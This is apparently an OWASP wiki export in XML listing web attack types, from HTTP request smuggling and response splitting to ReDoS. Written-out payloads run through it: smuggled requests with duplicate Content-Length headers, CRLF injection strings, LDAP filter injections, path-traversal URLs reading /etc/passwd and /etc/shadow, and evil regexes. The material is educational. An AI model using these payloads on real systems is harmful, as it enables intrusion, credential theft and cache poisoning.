Let's examine what happens when this request is sent to the W/S via the proxy server. First, the proxy parses the POST request in lines 1-7 (in blue), and encounters the two "Content-Length" headers. As we mentioned earlier, it decides to ignore the first header, so it assumes the request has a body of length 44 bytes. Therefore, it treats the data in lines 8-10 as the first request body (lines 8-10, in purple, contain exactly 44 bytes). The proxy then parses lines 11-14 (in red), which treats as the client's second request. Now let's see how the W/S interprets the same payload, once it has been forwarded to it by the proxy.[[Category:FIXME|is the code above supposed to be in color?]]
Unlike the proxy, the W/S uses the first "Content-Length" header: as far as it's concerned, the first POST request has no body, and the second request is the GET in line 8 (notice that the GET in line 11 is parsed by the W/S as the value of the "Bla" header in line 10). To summarize, this is how the data is partitioned by the two servers:
                                  1st request        2nd request
             SunONE Proxy          lines 1-10        lines 11-14
             SunONE W/S            lines 1-7         lines 8-14

Next, let's see which responses are sent back to the client. The requests the W/S sees are "POST /foobar.html" (from line 1) and "GET /poison.html" (from line 8), so it sends back two responses with the contents of the "foobar.html" page and the "poison.html" page, respectively. The proxy matches these responses to the two requests it thinks were sent by the client - "POST /foobar.html" (line 1) and "GET /page_to_poison.html" (line 11). Since the response is cacheable (we assumed "poison.html" is a cacheable page), the proxy caches the contents of "poison.html" under the URL "page_to_poison.html", and voila:  the cache is poisoned! Any client requesting "page_to_poison.html" from the proxy would receive the "poison.html" page.
A technical note: Lines 1-10 and 11-14 have to be sent in two separate packets, since SunONE Proxy doesn't pipeline requests on the same packet.

===Example 2 - Request Credential Hijacking===

Another area of interest is the ability of the attacker to forcefully invoke a script (/some_page.jsp) with a client's credentials. This attack is similar in effect to the [[Cross-Site Request Forgery]] attack, yet it is more powerful because the attacker is not required to interact with the client (victim).
The attack is as follows:

 POST /some_script.jsp HTTP/1.0
 Connection: Keep-Alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 9
 Content-Length: 142
 this=thatGET /some_page.jsp?param1=value1&amp;param2=value2 HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 Foobar:

When the client sends a request, such as:
 GET /mypage.jsp HTTP/1.0
 Cookie: my_id=1234567
 Authorization: Basic ugwerwguwygruwy

Tomcat will glue this to the queued incomplete request, and together, it will have:
 GET /some_page.jsp?param1=value1&amp;param2=value2 HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 Foobar: GET /mypage.jsp HTTP/1.0
 Cookie: my_id=1234567
 Authorization: Basic ugwerwguwygruwy

Now a complete request, it will invoke the script /some_page.jsp and return its results to the client. If this script is a password change request, or a money transfer to the attacker's account, then this may potentially incur serious damage to the client.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>HTTP Response Splitting</name>
    <description>HTTP response splitting occurs when:

* Data enters a web application through an untrusted source, most frequently an HTTP request. 
* The data is included in an HTTP response header sent to a web user without being validated for malicious characters. 

HTTP response splitting is a means to an end, not an end in itself. At its root, the attack is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP response header.

To mount a successful exploit, the application must allow input that contains CR (carriage return, also given by %0d or \r) and LF (line feed, also given by %0a or \n)characters into the header AND the underlying platform must be vulnerable to the injection of such characters. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allow them to create additional responses entirely under their control.

The example below uses a Java example, but this issue has been fixed in virtually all modern Java EE application servers. If you are concerned about this risk, you should test on the platform of concern to see if the underlying platform allows for CR or LF characters to be injected into headers. We suspect that, in general, this vulnerability has been fixed in most modern application servers, regardless of what language the code has been written in.</description>
    <environment />
    <example>The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.

&lt;pre&gt;
	String author = request.getParameter(AUTHOR_PARAM);
	...
	Cookie cookie = new Cookie("author", author);
        cookie.setMaxAge(cookieExpiration);
        response.addCookie(cookie);
&lt;/pre&gt;

Assuming a string consisting of standard alpha-numeric characters, such as "Jane Smith", is submitted in the request the HTTP response including this cookie might take the following form:

&lt;pre&gt;
	HTTP/1.1 200 OK
	...
	Set-Cookie: author=Jane Smith
	...
&lt;/pre&gt;

However, because the value of the cookie is formed of unvalidated user input, the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Wiley Hacker\r\nHTTP/1.1 200 OK\r\n...", then the HTTP response would be split into two responses of the following form:

&lt;pre&gt;
	HTTP/1.1 200 OK
	...
	Set-Cookie: author=Wiley Hacker
	
	HTTP/1.1 200 OK
	...
&lt;/pre&gt;

Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of the attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: [[Cross-User Defacement]], [[Cache Poisoning]], [[Cross-site Scripting (XSS)]] and [[Page Hijacking]].
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>LDAP injection</name>
    <description>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree.
The same advanced exploitation techniques available in [[SQL Injection]] can be similarly applied in LDAP Injection.</description>
    <environment />
    <example>===Example 1===
In a page with a user search form, the following code is responsible to catch input value and generate a LDAP query that will be used in LDAP database.

  &lt;input type="text" size=20 name="userName"&gt;Insert the username&lt;/input&gt; 

The  LDAP query is narrowed down for performance and the underlying code for this function might be the following:
  String ldapSearchQuery = "(cn=" + $userName + ")";
  System.out.println(ldapSearchQuery); 

If the variable $userName is not validated, it could be possible accomplish LDAP injection, as follows:
*If a user puts “*” on box search, the system may return all the usernames on the LDAP base
*If a user puts “jonys) (| (password = * ) )”, it will generate the code bellow revealing jonys’ password ( cn = jonys ) ( | (password = * ) )

===Example 2===
The following vulnerable code is used in an ASP web application which provides login with an LDAP database. 
On line 11, the variable userName is initialized and validated to check if it’s not blank. Then, the content of this variable is used to construct an LDAP query used by SearchFilter on line 28. The attacker has the chance specify what will be queried on LDAP server, and see the result on the line 33 to 41; all results and their attributes are displayed.

Commented vulnerable asp code:
 &lt;nowiki&gt; 
 1.	&lt;html&gt;
 2.	&lt;body&gt;
 3.	&lt;%@ Language=VBScript %&gt;
 4.	&lt;%
 5.	Dim userName
 6.	Dim filter
 7.	Dim ldapObj
 8.		
 9.	Const LDAP_SERVER = "ldap.example"
 10.	
 11.	userName = Request.QueryString("user")
 12.	
 13.	if( userName = "" ) then
 14.	Response.Write("Invalid request. Please specify a valid
 15.	user name")
 16.	Response.End()
 17.	end if
 18.	
 19.	filter = "(uid=" + CStr(userName) + ")" ' searching for the  user entry 
 20.	
 21.	'Creating the LDAP object and setting the base dn
 22.	Set ldapObj = Server.CreateObject("IPWorksASP.LDAP")
 23.	ldapObj.ServerName = LDAP_SERVER
 24.	ldapObj.DN = "ou=people,dc=spilab,dc=com"
 25.	
 26.	'Setting the search filter
 27.	ldapObj.SearchFilter = filter
 28.	
 29.	ldapObj.Search
 30.	
 31.	'Showing the user information
 32.	While ldapObj.NextResult = 1
 33.	Response.Write("&lt;p&gt;")
 34.	
 35.	Response.Write("&lt;b&gt;&lt;u&gt;User information for: " + 
 36.	ldapObj.AttrValue(0) + "&lt;/u&gt;&lt;/b&gt;&lt;br&gt;")
 37.	For i = 0 To ldapObj.AttrCount -1
 38.	Response.Write("&lt;b&gt;" + ldapObj.AttrType(i) +"&lt;/b&gt;: " +
 39.	ldapObj.AttrValue(i) + "&lt;br&gt;" )
 40.	Next
 41.	Response.Write("&lt;/p&gt;")
 42.	Wend
 43.	%&gt;
 44.	&lt;/body&gt;
 45.	&lt;/html&gt;   &lt;/nowiki&gt;
 
In the example above, we send the * character in the user parameter which will result in the filter variable in the code to be initialized with (uid=*). The resulting LDAP statement will make the server return any object that contains a uid attribute like username.

 &lt;nowiki&gt; http://www.some-site.org/index.asp?user=*  &lt;/nowiki&gt;
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Man-in-the-browser attack</name>
    <description>The Man-in-the-Browser attack is the same approach as [[Man-in-the-middle attack]], but in this case a [[Trojan Horse]] is used to intercept and manipulate calls between the main application’s executable (ex: the browser) and its security mechanisms or libraries on-the-fly.

The most common objective of this attack is to cause financial fraud by manipulating transactions of Internet Banking systems, even when other authentication factors are in use.

A previously installed Trojan horse is used to act between the browser and the browser’s security mechanism, sniffing or modifying transactions as they are formed on the browser, but still displaying back the user's intended transaction. 

Normally, the victim must be smart in order to notice a signal of such attack while he is accessing a web application like an internet banking account, even in presence of SSL channels, because all expected controls and security mechanisms are displayed and work normally.

Points of effect:
*	'''Browser Helper Objects''' – dynamically-loaded libraries loaded by Internet Explorer upon startup
*	'''Extensions''' – the equivalent to Browser Helper Objects for Firefox Browser
*	'''API-Hooking''' – this is the technique used by Man-in-the-Browser to perform its Man-in-the-Middle between the executable application (EXE) and its libraries (DLL).
*	'''Javascript''' – By using a malicious Ajax worm, as described on [http://myappsecurity.blogspot.com/2007/01/ajax-sniffer-prrof-of-concept.html Ajax Sniffer - Proof of Concept]</description>
    <environment />
    <example>===Manipulation thru DOM interface===

In order to perform this attack, an attacker may progress thru the following steps:

# The Trojan infects the computer's software, either OS or Application.
# The Trojan installs an extension into the browser configuration, so that it will be loaded next time the browser starts.
# At some later time, the user restarts the browser.
# The browser loads the extension.
# The extension registers a handler for every page-load.
# Whenever a page is loaded, the URL of the page is searched by the extension against a list of known sites targeted for attack.
# The user logs in securely on to for example &lt;nowiki&gt; https://secure.original.site/.&lt;/nowiki&gt;
# When the handler detects a page-load for a specific pattern in its targeted list (for example &lt;nowiki&gt;https://secure.original.site/account/do_transaction&lt;/nowiki&gt;) it registers a button event handler.
# When the submit button is pressed, the extension extracts all data from all form fields through the DOM interface in the browser, and remembers the values.
# The extension modifies the values through the DOM interface.
# The extension tells the browser to continue to submit the form to the server.
# The browser sends the form, including the modified values, to the server.
# The server receives the modified values in the form as a normal request. The server cannot differentiate between the original values and the modified values, or detect the changes.
# The server performs the transaction and generates a receipt.
# The browser receives the receipt for the modified transaction.
# The extension detects the &lt;nowiki&gt; https://secure.original.site/account/receipt&lt;/nowiki&gt; URL, scans the HTML for the receipt fields, and replaces the modified data in the receipt with the original data that it remembered in the HTML.
# The browser displays the modified receipt with the original details.
# The user thinks that the original transaction was received by the server intact and authorized correctly.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Man-in-the-middle attack</name>
    <description>The man-in-the middle attack intercepts a communication between two systems. For example, in an http transaction the target is the TCP connection between client and server.
Using different techniques, the attacker splits the original TCP connection into 2 new connections, one between the client and  the attacker and the other between the attacker and the server, as shown in figure 1. Once  the TCP connection is intercepted, the attacker acts as a proxy, being able to read, insert and modify the data in the intercepted communication. 

&lt;center&gt;
[[Image:main_the_middle.JPG]]

Figure 1. Illustration of man-in-the-middle attack
&lt;/center&gt;

The MITM attack is very effective because of the nature of the http protocol and data transfer which are  all ASCII based. In this way, it’s possible to view and interview within the http protocol and  also in the data transferred. So, for example,  it’s possible to capture a session cookie reading the http header, but it’s also possible to change  an  amount of  money transaction inside the application context, as shown in figure 2.

&lt;center&gt;
[[Image:request.JPG]]

Figure 2. Illustration of a HTTP Packet intercepted with Paros Proxy.
&lt;/center&gt;

The MITM attack could also be done over an https connection by using the same technique; the only difference consists in the establishment of two independent SSL sessions, one over each TCP connection. The browser sets  a SSL connection with the attacker, and the attacker establishes  another SSL connection with the web server. In general the browser warns  the user that the digital certificate used is not valid, but the user may ignore the warning because he doesn’t understand the threat. In some specific contexts it’s possible that the warning doesn’t appear, as for example, when the Server certificate is compromised by the attacker or when the attacker certificate is signed by a trusted CA and the CN is the same of the original web site.

MITM is not only an attack technique, but is also usually used during the development step of a web application or is still used for Web Vulnerability assessments.

===MITM Attack tools===
There are several tools to realize a MITM attack. These tools are particularly efficient in LAN network environments, because they implement extra functionalities, like the arp spoof capabilities that permit the interception of communication between hosts.

*	PacketCreator
*	Ettercap
*	Dsniff
*	Cain e Abel
[[Category:FIXME|could these all be links?]]

===MITM Proxy only tools===
Proxy tools only permit interactiion with the parts of the HTTP protocol, like the header and the body of a transaction, but do not have the capability to intercept the TCP connection between client and server. To intercept the communication, it’s necessary to use other network attack tools or configure the browser.

*	[[OWASP WebScarab]]
*	Paros Proxy
*	Burp Proxy
*	ProxyFuzz
*	Odysseus Proxy
*	Fiddler (by Microsoft)
</description>
    <environment />
    <example />
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Mobile code: invoking untrusted mobile code</name>
    <description>This attack consists of a manipulation of a mobile code in order to execute malicious operations at the client side. By intercepting client traffic using the [[Man-in-the-middle_attack|man-in-the-middle]]  technique, a malicious user could modify the original mobile code with arbitrary operations that will be executed on the client’s machine under his credentials. 
In another scenario, the malicious mobile code could be hosted in an untrustworthy web site or it could be permanently injected on a vulnerable web site through an injection attack.
This attack can be performed over Java or C++ applications and affects any operating system.</description>
    <environment />
    <example>The following code demonstrates how this attack could be performed using a Java applet. 

&lt;pre&gt;
 // here declarer a object URL with the path of the malicious class
 URL[] urlPath= new URL[]{new URL("file:subdir/")};

 // here generate a object “loader” which is responsible to load a class in the URL path
 URLClassLoader  classLoader = new URLClassLoader(urlPath); 

 //here declare a object of a malicious class contained in “classLoader”
 Class loadedClass = Class.forName("loadMe", true, classLoader);&lt;br&gt;&lt;br&gt;
&lt;/pre&gt;

To solve this issue, it’s necessary to use some type of integrity mechanism to assure that the mobile code has not been modified.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Mobile code: non-final public field</name>
    <description>This attack aims to manipulate non-final public variables used in mobile code, by injecting malicious values on it, mostly in Java and C++ applications.

When a public member variable or class used in mobile code isn’t declared as final, its values can be maliciously manipulated by any function that has access to it in order to extend the application code or acquire critical information about the application.</description>
    <environment />
    <example>A Java applet from a certain application is acquired and subverted by an attacker. Then, he makes the victim accept and run a Trojan or malicious code that was prepared to manipulate non-final objects’  state and behavior. This code is instantiated and executed continuously using default JVM on the victim’s machine. When the victim invokes the Java applet from the original application using the same JVM, the malicious process could be mixed with original applet, thus it modifies values of non-final objects and executes under victim’s credentials.

In the following example, the class “any_class” is declared as final and  “server_addr” variable is not:

 public final class any_class extends class_Applet {
 public URL server_addr;
 …
 }

In this case, the value of “server_addr” variable could be set by any other function that has access to it, thus changing the application behavior.
A proper way to declare this variable is:

 public class any_class extends class_Applet {
 public final URL server_addr;
 …
 }

When a variable is declared as final its value cannot be modified.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Mobile code: object hijack</name>
    <description>This attack consists of a technique to create objects without constructors’ methods by taking advantage of the clone() method of Java-based applications.

If a certain class implements cloneable() method declared as public, but doesn’t has a public constructor method nor is declared as final, it is possible to extend it into a new class and create objects using the clone() method.

The clonable() method certifies that the clone() method functions correctly. A cloned object has the same attributes (variables values) of the original object, but the objects are independent.</description>
    <environment />
    <example>In this example, a public class “BankAccount” implements the clonable() method which declares “Object clone(string accountnumber)”:

 public class BankAccount implements Cloneable{
 public Object clone(String accountnumber) throws                                                                                                  
 CloneNotSupportedException
      {
       Object returnMe = new BankAccount(account number);
       …
      }
 }

An attacker can implement a malicious public class that extends the parent BankAccount class, as follows: 

 public class MaliciousBankAccount extends BankAccount implements   
                                                       Cloneable{
 public Object clone(String accountnumber) throws CloneNotSupportedException 
               {
                Object returnMe = super.clone();
                …
               }
 }

A Java applet from a certain application is acquired and subverted by an attacker. Then, he makes the victim accept and run a [[Trojan Horse|Trojan]] or malicious code that was prepared to manipulate objects’ state and behavior. This code is instantiated and executed continuously using default JVM on victim’s machine. When the victim invokes the Java applet from the original application using the same JVM, then the attacker clones the class, he manipulates the attributes values, and then substitutes the original object for the malicious one.
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Overflow Binary Resource File</name>
    <description>The source of a buffer overflow may be input data.
When it comes from the  Overflow Binary Resource File, the attacker has to modify/prepare the binary file in such a way that the
application, after reading this file, has become prone to a classic [[Buffer overflow attack]]. The only difference between this attack
and the classic one is the source of the input data. Common examples are specially crafted MP3, JPEG or ANI files, which cause buffer overflows.</description>
    <environment />
    <example>The application reads the first 8 characters from the binary file.
&lt;pre&gt;
rezos@dojo-labs ~/owasp/binary $ cat read_binary_file.c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void)
{
       FILE *f;
       char p[8];
       char b[8];

       f = fopen("file.bin", "r");
       fread(b, sizeof(b), 1, f);
       fclose(f);

       strcpy(p, b);

       printf("%s\n", p);

       return 0;
}
&lt;/pre&gt;
The crafted file contains more than 8 characters.
&lt;pre&gt;
rezos@dojo-labs ~/owasp/binary $ cat file.bin
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/pre&gt;
After an attempt to run one more time, the application will end with:
&lt;pre&gt;
rezos@dojo-labs ~/owasp/binary $ ./read_binary_file
Segmentation fault
&lt;/pre&gt;
Failure. Was it buffer overflow?
&lt;pre&gt;
rezos@dojo-labs ~/owasp/binary $ gdb -q ./read_binary_file
Using host libthread_db library "/lib/libthread_db.so.1".
(gdb) r
Starting program: /home/rezos/owasp/binary/read_binary_file

Program received signal SIGSEGV, Segmentation fault.
0xb7e4b9e3 in strcpy () from /lib/libc.so.6
&lt;/pre&gt;
Yes, that was a buffer overflow in a strcpy() function.

Why?

fread(b, sizeof(b), 1, f); -  reads characters from the stream f, sizeof(b) once, to the buffer b. It looks OK.
However there is no room for a '\0', which terminates the string.

Whiile executing strcpy(p, b); where both buffers are equal, overflow takes place. What causes it is the absence of the
null byte/terminating character in a buffer b[]. The strcpy() function will copy into the buffer p[] everything starting
in b[0] and ending on the null byte. The attacker has successfully conducted the buffer overflow attack by crafting a
special file.

* Use safe equivalent functions, which check the buffer length, whenever possible.

Namely:
*gets() -&gt; fgets()
*strcpy() -&gt; strncpy()
*strcat() -&gt; strncat()
*sprintf() -&gt; snprintf()

* Those functions which don't have safe equivalents should be rewritten with safe checks implemented. Time spent on that will benefit in the future. Remember that you have to do it only once.

* Use compilers, which are able to identify unsafe functions, logic errors, and check if the memory is overwritten when and where it shouldn't be.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Page Hijacking</name>
    <description>In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.</description>
    <environment />
    <example />
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Parameter Delimiter</name>
    <description>This attack is based on the manipulation of parameter delimiters used by web application input vectors in order to cause unexpected behaviors like access control and authorization bypass and information disclosure, among others.
</description>
    <environment />
    <example>In order to illustrate this vulnerability, we will use a vulnerability found on Poster V2, a posting system based on PHP programming language. 

This application has a dangerous vulnerability that allows inserting data into user fields (username, password, email address and privileges) in “mem.php” file, which is responsible for managing the application user.

An example of the file “mem.php”, where user Jose has admin privileges and Alice user access:

 &lt;?
 Jose|12345678|jose@attack.com|admin|
 Alice|87654321|alice@attack.com|normal|
 ?&gt;

When a user wants to edit his profile, he must use the "edit account” option in the “index.php” page and enter his login information. However, using “|” as a parameter delimiter on email field followed by “admin”, the user could elevate his privileges to administrator. Example:

 Username: Alice
 Password: 87654321
 Email: alice@attack.com |admin| 

This information will be recorded in “mem.php” file like this: 

 Alice|87654321|alice@attack.com|admin|normal|

In this case, the last parameter delimiter considered is “|admin|” and the user could elevate his privileges by assigning administrator profile.

Although this vulnerability doesn’t allow manipulation of other users' profiles, it allows privilege escalation for application users.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Path Manipulation</name>
    <description>Path manipulation errors occur when the following two conditions are met:

# An attacker can specify a path used in an operation on the filesystem. 
# By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker. 

Allowing user input to control paths used in filesystem operations may enable an attacker to access or modify  protected system resources.</description>
    <environment />
    <example>===Example 1===

The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files.

&lt;pre&gt;
	String rName = request.getParameter("reportName");
	File rFile = new File("/usr/local/apfr/reports/" + rName);
	...
	rFile.delete();
&lt;/pre&gt;

===Example 2===

The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.

&lt;pre&gt;
	fis = new FileInputStream(cfg.getProperty("sub")+".txt");
	amt = fis.read(arr);
	out.println(arr);
&lt;/pre&gt;
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Path Traversal</name>
    <description>A Path Traversal attack aims to access files and directories that are stored outside the web root folder. By browsing the application, the attacker looks for absolute links to files stored on the web server. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration and critical system files, limited by system operational access control. 
The attacker uses  “../” sequences to move up to root directory, thus permitting navigation through the file system. 

This attack can be executed with an external malicious code injected on the path, like the [[Resource Injection]] attack. To perform this attack it’s not necessary to use a specific tool; attackers typically use a spider/crawler to detect all URLs available.

This attack is also known as “dot-dot-slash”, “directory traversal”, “directory climbing” and “backtracking”.

===Request variations===

Encoding and double encoding:

 %2e%2e%2f represents ../
 %2e%2e/ represents ../
 ..%2f represents ../ 
 %2e%2e%5c represents ..\
 %2e%2e\ represents ..\ 
 ..%5c represents ..\ 
 %252e%252e%255c represents ..\ 
 ..%255c represents ..\ and so on. 

'''Percent encoding (aka URL encoding)'''

Note that web containers perform one level of decoding on percent encoded values from forms and URLs.

 ..%c0%af represents ../ 
 ..%c1%9c represents ..\ 

'''OS specific'''

UNIX 
 Root directory:  “ / “ 
 Directory separator: “ / “

WINDOWS
 Root directory: “  &lt;partition letter&gt; : \ “
 Directory separator: “ / “ or “ \ ” 
 Note that windows allows filenames to be followed by extra . \ / characters.

In many operating systems, null bytes %00 can be injected to terminate the filename. For example, sending a parameter like:
 ?file=secret.doc%00.pdf
will result in the Java application seeing a string that ends with ".pdf" and the operating system will see a file that ends in ".doc". Attackers may use this trick to bypass validation routines.</description>
    <environment />
    <example>===Example 1===
The following examples show how the application deals with the resources in use.
 &lt;nowiki&gt; http://some_site.com.br/get-files.jsp?file=report.pdf  &lt;/nowiki&gt;
 &lt;nowiki&gt; http://some_site.com.br/get-page.php?home=aaa.html  &lt;/nowiki&gt;
 &lt;nowiki&gt; http://some_site.com.br/some-page.asp?page=index.html  &lt;/nowiki&gt;

In these examples it’s possible to insert a malicious string as the variable parameter to access files located outside the web publish directory. 
  &lt;nowiki&gt; http://some_site.com.br/get-files?file=../../../../some dir/some file &lt;/nowiki&gt;

  &lt;nowiki&gt; http://some_site.com.br/../../../../some dir/some file &lt;/nowiki&gt;

The following URLs show examples of *NIX password file exploitation.

 &lt;nowiki&gt;http://some_site.com.br/../../../../etc/shadow  &lt;/nowiki&gt;
 &lt;nowiki&gt;http://some_site.com.br/get-files?file=/etc/passwd &lt;/nowiki&gt;

Note: In a windows system an attacker can navigate only in a partition that locates web root while in the Linux he can navigate in the whole disk.

===Example 2===
It's also possible to include files and scripts located on external website.
 &lt;nowiki&gt; http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php   &lt;/nowiki&gt;

===Example 3===
These examples illustrate a case when an attacker made the server show the CGI source code.
 &lt;nowiki&gt; http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi   &lt;/nowiki&gt;

===Example 4===
This example was extracted from: Wikipedia - Directory Traversal 

A typical example of vulnerable application code is:

&lt;pre&gt;&lt;nowiki&gt;
&lt;?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?&gt;
&lt;/nowiki&gt;&lt;/pre&gt;

An attack against this system could be to send the following HTTP request:
&lt;pre&gt;
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
&lt;/pre&gt;

Generating a server response such as:
&lt;pre&gt;
HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh 
daemon:*:1:1::/tmp: 
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
&lt;/pre&gt;

The repeated &lt;tt&gt;../&lt;/tt&gt; characters after /home/users/phpguru/templates/ has caused 
[http://www.php.net/manual/en/function.include.php include()] to traverse to the root directory, and then include the UNIX password file [[passwd|/etc/passwd]]. 

UNIX etc/passwd is a common file used to demonstrate '''directory traversal''', as it is often used by crackers to try cracking the passwords.

===Absolute Path Traversal===

The following URLs may be vulnerable to this attack:

 &lt;nowiki&gt;http://testsite.com/get.php?f=list&lt;/nowiki&gt;
 &lt;nowiki&gt;http://testsite.com/get.cgi?f=2&lt;/nowiki&gt;
 &lt;nowiki&gt;http://testsite.com/get.asp?f=test&lt;/nowiki&gt;

An attacker can execute this attack  like this:

 &lt;nowiki&gt;http://testsite.com/get.php?f=/var/www/html/get.php&lt;/nowiki&gt;
 &lt;nowiki&gt;http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc&lt;/nowiki&gt;
 &lt;nowiki&gt;http://testsite.com/get.asp?f=/etc/passwd&lt;/nowiki&gt;

When the web server returns information about errors in a web application, it is much easier for the attacker to guess the correct locations (e.g. path to the file with a source code, which then may be displayed).</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Reflected DOM Injection</name>
    <description>Reflected DOM Injection, or ''RDI'', is a form of [[Cross-site_scripting#Stored_and_Reflected_XSS_Attacks|Stored Cross-Site Scripting]].

The outline of the attack is as follows:

# Crawler G retrieves data elements from attacker page A and commits the content to persisted storage as G[A] (e.g., a database row).
# End user visits application T. Application T's persisted storage is the set of {G}.
# End user's interaction with application T results in invocation of JavaScript code whereby G[A] is retrieved, and due to a failure neutralize the content in G[A] either prior to its persisted storage or during JavaScript execution at page runtime on the DOM, G[A] is executed as active code instead of being properly interpolated as a scalar-like primitive data value or closure-guarded object data.

Maturely programmed crawlers often attempt to strip malicious data from crawled resources prior to persistent storage. Additionally, maturely programmed applications often utilize output escaping or JavaScript sandboxing to prevent crawled data from being executed (instead of being safely rendered). Nonetheless, obfuscation of data on a crawled resource may sidestep detection algorithms (although obfuscation may hint at an attempted attack), and reliance strictly on crawler sanitization of crawled resources may result in stored cross-site scripts executing if the target JavaScript context does not actively defend against it. In summary, when the attack is successful, the attack succeeds due to improper [[Data_Validation|data validation]].

Arshan Dabirsiaghi surmised that vulnerability to this attack would eventually surface in popular search engines during his presentation at [[OWASP_NYC_AppSec_2008_Conference|OWASP NYC AppSec 2008]] and [[OWASP_AppSec_Europe_2008_-_Belgium|AppSec Europe 2008]], ''Next Generation Cross Site Scripting Worms'' (see also ''[https://www.owasp.org/images/1/1b/OWASP-AppSecEU08-Dabirsiaghi.pdf Building and Stopping Next Generation XSS Worms (May 8, 2008)]'', last accessed August 5, 2013). Daniel Chechik and Anat Davidi confirmed Dabirsiaghi's surmisal by demonstrating such vulnerability in the Google Translate web application and Yahoo! cached page results during the DEF CON 21 security conference in their August 2013 ''[https://defcon.org/html/defcon-21/dc-21-speakers.html#Chechik Utilizing Popular Websites for Malicious Purposes Using RDI]'' presentation.</description>
    <environment />
    <example />
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Regular expression Denial of Service - ReDoS</name>
    <description>===The problematic Regex naïve algorithm===
The Regular Expression naïve algorithm builds a [http://en.wikipedia.org/wiki/Nondeterministic_finite_state_machine Nondeterministic Finite Automaton (NFA)], which is a finite state machine where for each pair of state and input symbol there may be several possible next states. Then the engine starts to make transition until the end of the input. Since there may be several possible next states, a deterministic algorithm is used. This algorithm tries one by one all the possible paths (if needed) until a match is found (or all the paths are tried and fail).

For example, the Regex '''''^(a+)+$''''' is represented by the following NFA:

:::[[File:NFA.png]]

For the input '''''aaaaX''''' there are 16 possible paths in the above graph. But for '''''aaaaaaaaaaaaaaaaX''''' there are 65536 possible paths, and the number is double for each additional '''''a'''''. This is an extreme case where the naïve algorithm is problematic, because it must pass on many many paths, and then fail.

Notice, that not all algorithms are naïve, and actually Regex algorithms can be written in an efficient way. Unfortunately, most Regex engines today try to solve not only "pure" Regexes, but also "expanded" Regexes with "special additions", such as back-references that cannot be always be solved efficiently (see '''Patterns for non-regular languages''' in [http://en.wikipedia.org/wiki/Regular_expression Wiki-Regex] for some more details). So even if the Regex is not "expanded", a naïve algorithm is used.

===Evil Regexes===
A Regex is called "evil" if it can stuck on crafted input.

'''Evil Regex pattern contains''':
* Grouping with repetition
* Inside the repeated group:
** Repetition
** Alternation with overlapping

'''Examples of Evil Patterns''':
* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} | for x &gt; 10

All the above are susceptible to the input '''''aaaaaaaaaaaaaaaaaaaaaaaa!''''' (The minimum input length might change slightly, when using faster or slower machines).

===Attacks===
The attacker might use the above knowledge to look for applications that use Regular Expressions, containing an '''Evil Regex''', and send a well-crafted input, that will hang the system. Alternatively, if a Regex itself is affected by a user input, the attacker can inject an '''Evil Regex''', and make the system vulnerable.
</description>
    <environment />
    <example>===Vulnerable Regex in online repositories===
